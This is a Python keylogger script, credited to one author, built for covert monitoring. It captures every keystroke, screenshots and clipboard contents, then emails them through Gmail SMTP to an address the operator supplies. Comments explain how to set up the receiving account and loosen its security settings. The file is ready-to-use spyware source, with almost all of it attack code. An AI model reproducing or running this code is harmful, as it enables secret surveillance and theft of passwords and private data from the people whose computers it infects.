#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

@author: Anand Gurav

"""

from pynput import keyboard        

import smtplib                     
from email.mime.multipart import MIMEMultipart     
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import autopy
import clipboard


subject ="here's your log master"

IPaddress = socket.gethostbyname(socket.gethostname())

logs=[]
message =""
text =""


def on_press(key):
    global logs
    print('alphanumeric key {0} pressed'.format(key))
    k=str(key).replace("'","")
    if(k=="Key.backspace" and len(log)!=0):
        logs.pop()
    else:
        logs.append(k)
    '''here i have consider 1000 words after that it will send the mail
       you can change according to your need
    '''
    if(len(logs)>1000):
        write_file(logs)
        logs=[]
        
def write_file(logs):
    #print("in write_file")
    global message
    for k in logs:
        if(k.find("space")>0):
            k=" "
            message +=k
        elif(k.find("enter")>0):
            k="[ENTER]\n"
            message +=k
        elif(k.find("Key")==-1):
            message +=k
    send_mail()
    

def on_release(key):
    global logs
    if key == keyboard.Key.esc:
        if(logs):
            write_file(logs)
            logs=[]
        return False
    
def send_mail():
    global message,text
    
    
    sender = 'your email address'
    password = 'your password'
    
    
    '''create a new gmail account where keylogger will send the file to
    NOTE:
        You Have to enable this:
            allowing less secure apps to access your account
            (https://support.google.com/accounts/answer/6010255)
            refer this link
    '''
    
    if(IPaddress!='127.0.0.1'):
        print("connected")
        email_message = MIMEMultipart()
        email_message['Subject']=subject
        print(message)
        print(len(message))

        email_message.attach(MIMEText(message, "plain"))
        take_screenshot()
        message=""
        filename = "screengrab.png"  
        
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())   
            encoders.encode_base64(part)
            
            part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {filename}",
                    )
        email_message.attach(part)
        email_message.attach(MIMEText("\n", "plain"))
        get_clipboard()
        email_message.attach(MIMEText(text, "plain"))
        text=""
        send=email_message.as_string()
        print(len(send))
        if(len(send)!=307):
            print('inside if')
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(sender, password)
            s.sendmail(sender,sender,send)
            send=''
            print("sent")
    else:
        print("not connected")
        
   
def take_screenshot():
      autopy.bitmap.capture_screen().save('screengrab.png') 

     
def get_clipboard():
    global text
    text = "It contains clipboard contents" + "\n" + clipboard.paste()    
    

            
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()














